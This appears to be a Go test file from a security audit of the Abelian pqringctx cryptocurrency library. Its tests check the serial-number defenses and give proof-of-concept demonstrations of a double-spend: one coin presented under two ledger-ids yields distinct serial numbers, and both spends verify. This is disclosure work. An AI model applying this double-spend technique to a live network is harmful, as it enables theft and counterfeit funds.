package pqringctx

// Hunt PoC (Abelian Round 1, area pqringct/pqringctx) — MLP layer.
// Same root cause as pqringct HUNT-01: the key image m_r = expandKIDRMLP
// hashes SerializeLgrTxoMLP(txo, id), so the SAME coin presented under two
// different ledger-ids yields two different key images / serial numbers,
// and the library's own TransferTxMLPGen + TransferTxMLPVerify accept
// spending it twice. Local code only, no network, no mainnet.

import (
	"bytes"
	"strings"
	"testing"
)

// --- N3 verification PoCs (handoff from abec-consensus hunter) ---
// Claims to verify in pinned pqringctx TransferTxMLPVerify:
// (1) duplicate-SN check inside one tx covers the cross-ring case
//     (map keyed by SN only, no ring component), and
// (2) each SN is recomputed from the key image / ledger TXO and compared
//     to the claimed SN, so a SN minted for ring A cannot satisfy ring B.

// n3Mint returns fresh txos: [0]=500-coin (addr 0), [1]=12-coin (addr 1),
// [2]=7-coin (addr 0, second decoy pool member).
func n3Mint(t *testing.T) []TxoMLP {
	t.Helper()
	txos := InitialTxo(CoinAddressTypePublicKeyForRingPre, []int{0, 1, 0}, 519, []uint64{500, 12, 7})
	if len(txos) != 3 {
		t.Fatalf("expected 3 minted txos, got %d", len(txos))
	}
	return txos
}

func n3VskCopy() []byte {
	c := make([]byte, len(valueSecretKeyPres[0]))
	copy(c, valueSecretKeyPres[0])
	return c
}

// n3MkInput builds a 1-input desc spending txos[0] (the 500-coin) with the
// given ledger-id for the real coin and the given decoy txo.
func n3MkInput(txos []TxoMLP, realID []byte, decoy TxoMLP) *TxInputDescMLP {
	return &TxInputDescMLP{
		lgrTxoList: []*LgrTxoMLP{
			{txo: txos[0], id: realID},
			{txo: decoy, id: RandomBytes(HashOutputBytesLen)},
		},
		sidx:                      0,
		coinSpendSecretKey:        coinSpendSecretKeyPres[0],
		coinSerialNumberSecretKey: coinSerialNumberSecretKeyPres[0],
		coinValuePublicKey:        valuePublicKeyPres[0],
		coinValueSecretKey:        n3VskCopy(),
		coinDetectorKey:           nil,
		value:                     500,
	}
}

func n3Outputs() []*TxOutputDescMLP {
	return []*TxOutputDescMLP{
		{coinAddress: coinAddressPres[0], coinValuePublicKey: valuePublicKeyPres[0], value: 400},
		{coinAddress: coinAddressPres[1], coinValuePublicKey: valuePublicKeyPres[1], value: 90},
	}
}

// N3-A: same SN twice in one tx (two different rings, same coin+id) is
// REJECTED by TransferTxMLPVerify, and the error is the duplicate-SN
// check (not a downstream sig/balance failure).
func TestN3_SameSerialDifferentRings_Rejected(t *testing.T) {
	InitialAddress()
	txos := n3Mint(t)
	idA := make([]byte, HashOutputBytesLen)
	idB := make([]byte, HashOutputBytesLen)
	for i := range idB {
		idB[i] = 0x01
	}
	// Two-input tx spending the same coin twice under different ids
	// (HUNT-01b shape): verifies OK, SNs differ.
	trTx, err := pp.TransferTxMLPGen(
		[]*TxInputDescMLP{n3MkInput(txos, idA, txos[1]), n3MkInput(txos, idB, txos[2])},
		[]*TxOutputDescMLP{
			{coinAddress: coinAddressPres[0], coinValuePublicKey: valuePublicKeyPres[0], value: 900},
			{coinAddress: coinAddressPres[1], coinValuePublicKey: valuePublicKeyPres[1], value: 90},
		}, 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("setup TransferTxMLPGen: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTx); err != nil {
		t.Fatalf("setup: double-input tx should verify before SN mutation: %v", err)
	}
	// Now force the same-SN-across-rings shape: copy SN0 onto input 1.
	trTx.txInputs[1].serialNumber = trTx.txInputs[0].serialNumber
	// NOTE: even the honest serializer refuses this tx (SerializeTransferTxMLP
	// runs TransferTxMLPSanityCheck, which contains the same duplicate-SN
	// check) — so verify it in-memory, which is exactly the path abec takes
	// after DeserializeTransferTxMLP (deserialization itself does not check
	// SNs; verification does).
	err = pp.TransferTxMLPVerify(trTx)
	if err == nil {
		t.Fatalf("same-SN-across-rings tx VERIFIED - duplicate-SN backstop missing!")
	}
	t.Logf("same-SN-across-rings tx rejected: %v", err)
	if !strings.Contains(err.Error(), "double-spending") && !strings.Contains(err.Error(), "same as") {
		t.Fatalf("rejection did NOT come from the duplicate-SN check (expected 'double-spending'/'same as'): %v", err)
	}
	t.Logf("CONFIRMED: duplicate-SN check fires for cross-ring same-SN in one tx")
}

// N3-B: a forged SN (random bytes) is REJECTED by the SN-recompute check.
func TestN3_ForgedSerial_RejectedByRecompute(t *testing.T) {
	InitialAddress()
	txos := n3Mint(t)
	idA := make([]byte, HashOutputBytesLen)
	trTx, err := pp.TransferTxMLPGen([]*TxInputDescMLP{n3MkInput(txos, idA, txos[1])}, n3Outputs(), 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("setup TransferTxMLPGen: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTx); err != nil {
		t.Fatalf("setup: tx should verify before SN mutation: %v", err)
	}
	trTx.txInputs[0].serialNumber = RandomBytes(HashOutputBytesLen)
	ser, err := pp.SerializeTransferTxMLP(trTx, true)
	if err != nil {
		t.Fatalf("SerializeTransferTxMLP: %v", err)
	}
	deser, err := pp.DeserializeTransferTxMLP(ser, true)
	if err != nil {
		t.Fatalf("DeserializeTransferTxMLP: %v", err)
	}
	err = pp.TransferTxMLPVerify(deser)
	if err == nil {
		t.Fatalf("forged-SN tx VERIFIED - SN-recompute backstop missing!")
	}
	t.Logf("forged-SN tx rejected: %v", err)
	if !strings.Contains(err.Error(), "computed serialNumber is different") {
		t.Fatalf("rejection did NOT come from the SN-recompute check: %v", err)
	}
	t.Logf("CONFIRMED: SN is recomputed from key image and compared to claimed SN")
}

// N3-C: the SN is bound to (coin, ledger-id), NOT to the decoy ring:
// same coin + same id in two DIFFERENT decoy rings yields the IDENTICAL
// SN (both txs verify individually). Hence a "SN minted for ring A" is
// the same SN for ring B iff the real coin+id are the same — in which
// case the N3-A duplicate check (one tx) and the ledger spent-SN set
// (across txs, abec side) are the defenses; a SN minted for a DIFFERENT
// (coin,id) cannot satisfy another ring (N3-B + elrs binding).
func TestN3_SerialBoundToCoinAndID_NotToDecoyRing(t *testing.T) {
	InitialAddress()
	txos := n3Mint(t)
	idA := make([]byte, HashOutputBytesLen)
	trTxA, err := pp.TransferTxMLPGen([]*TxInputDescMLP{n3MkInput(txos, idA, txos[1])}, n3Outputs(), 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("gen A: %v", err)
	}
	trTxB, err := pp.TransferTxMLPGen([]*TxInputDescMLP{n3MkInput(txos, idA, txos[2])}, n3Outputs(), 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("gen B: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTxA); err != nil {
		t.Fatalf("tx A should verify: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTxB); err != nil {
		t.Fatalf("tx B should verify: %v", err)
	}
	snA := trTxA.txInputs[0].serialNumber
	snB := trTxB.txInputs[0].serialNumber
	t.Logf("SN ring-A(decoy txos[1]) = %x", snA)
	t.Logf("SN ring-B(decoy txos[2]) = %x", snB)
	if !bytes.Equal(snA, snB) {
		t.Fatalf("same coin+id in different decoy rings gave DIFFERENT SNs - SN is not purely (coin,id)-bound")
	}
	t.Logf("CONFIRMED: SN depends only on (coin, ledger-id), not on decoy ring members")
}

func TestHunt01MLP_DoubleSpendSameCoinDifferentIDs_TwoTxs(t *testing.T) {
	InitialAddress()

	// Mint one 500-coin (addr 0) + one 12-coin decoy (addr 1).
	txos := InitialTxo(CoinAddressTypePublicKeyForRingPre, []int{0, 1}, 512, []uint64{500, 12})
	if len(txos) != 2 {
		t.Fatalf("expected 2 minted txos, got %d", len(txos))
	}

	vskCopy := func() []byte {
		c := make([]byte, len(valueSecretKeyPres[0]))
		copy(c, valueSecretKeyPres[0])
		return c
	}
	mkInput := func(id []byte) *TxInputDescMLP {
		return &TxInputDescMLP{
			lgrTxoList: []*LgrTxoMLP{
				{txo: txos[0], id: id},
				{txo: txos[1], id: RandomBytes(HashOutputBytesLen)},
			},
			sidx:                      0,
			coinSpendSecretKey:        coinSpendSecretKeyPres[0],
			coinSerialNumberSecretKey: coinSerialNumberSecretKeyPres[0],
			coinValuePublicKey:        valuePublicKeyPres[0],
			coinValueSecretKey:        vskCopy(),
			coinDetectorKey:           nil,
			value:                     500,
		}
	}
	mkOutputs := []*TxOutputDescMLP{
		{coinAddress: coinAddressPres[0], coinValuePublicKey: valuePublicKeyPres[0], value: 400},
		{coinAddress: coinAddressPres[1], coinValuePublicKey: valuePublicKeyPres[1], value: 90},
	}

	idA := make([]byte, HashOutputBytesLen)
	idB := make([]byte, HashOutputBytesLen)
	for i := range idB {
		idB[i] = 0x01
	}

	trTxA, err := pp.TransferTxMLPGen([]*TxInputDescMLP{mkInput(idA)}, mkOutputs, 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("TransferTxMLPGen A: %v", err)
	}
	trTxB, err := pp.TransferTxMLPGen([]*TxInputDescMLP{mkInput(idB)}, mkOutputs, 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("TransferTxMLPGen B: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTxA); err != nil {
		t.Fatalf("tx A should verify: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTxB); err != nil {
		t.Fatalf("tx B should verify: %v", err)
	}
	snA := trTxA.txInputs[0].serialNumber
	snB := trTxB.txInputs[0].serialNumber
	t.Logf("SN A = %x", snA)
	t.Logf("SN B = %x", snB)
	if bytes.Equal(snA, snB) {
		t.Fatalf("serial numbers are equal - spends link, no bug")
	}
	t.Logf("DOUBLE SPEND DEMONSTRATED (MLP): same 500-coin spent in two verifying txs (SNs differ), total outputs 980")
}

func TestHunt01MLP_DoubleSpendSameCoinDifferentIDs_OneTx(t *testing.T) {
	InitialAddress()

	txos := InitialTxo(CoinAddressTypePublicKeyForRingPre, []int{0, 1}, 512, []uint64{500, 12})
	if len(txos) != 2 {
		t.Fatalf("expected 2 minted txos, got %d", len(txos))
	}

	vskCopy := func() []byte {
		c := make([]byte, len(valueSecretKeyPres[0]))
		copy(c, valueSecretKeyPres[0])
		return c
	}
	mkInput := func(id []byte) *TxInputDescMLP {
		return &TxInputDescMLP{
			lgrTxoList: []*LgrTxoMLP{
				{txo: txos[0], id: id},
				{txo: txos[1], id: RandomBytes(HashOutputBytesLen)},
			},
			sidx:                      0,
			coinSpendSecretKey:        coinSpendSecretKeyPres[0],
			coinSerialNumberSecretKey: coinSerialNumberSecretKeyPres[0],
			coinValuePublicKey:        valuePublicKeyPres[0],
			coinValueSecretKey:        vskCopy(),
			coinDetectorKey:           nil,
			value:                     500,
		}
	}
	idA := make([]byte, HashOutputBytesLen)
	idB := make([]byte, HashOutputBytesLen)
	for i := range idB {
		idB[i] = 0x01
	}
	trTx, err := pp.TransferTxMLPGen(
		[]*TxInputDescMLP{mkInput(idA), mkInput(idB)},
		[]*TxOutputDescMLP{
			{coinAddress: coinAddressPres[0], coinValuePublicKey: valuePublicKeyPres[0], value: 900},
			{coinAddress: coinAddressPres[1], coinValuePublicKey: valuePublicKeyPres[1], value: 90},
		}, 10, RandomBytes(10))
	if err != nil {
		t.Fatalf("TransferTxMLPGen with same coin twice (different ids) unexpectedly rejected: %v", err)
	}
	if err := pp.TransferTxMLPVerify(trTx); err != nil {
		t.Fatalf("double-input tx should verify (demonstrating the flaw): %v", err)
	}
	sn0 := trTx.txInputs[0].serialNumber
	sn1 := trTx.txInputs[1].serialNumber
	t.Logf("SN0 = %x\nSN1 = %x", sn0, sn1)
	if bytes.Equal(sn0, sn1) {
		t.Fatalf("serial numbers equal - spends link, no bug")
	}
	t.Logf("DOUBLE SPEND IN ONE TX DEMONSTRATED (MLP): one 500-coin funds 990 outputs (fee 10), SNs differ")
}
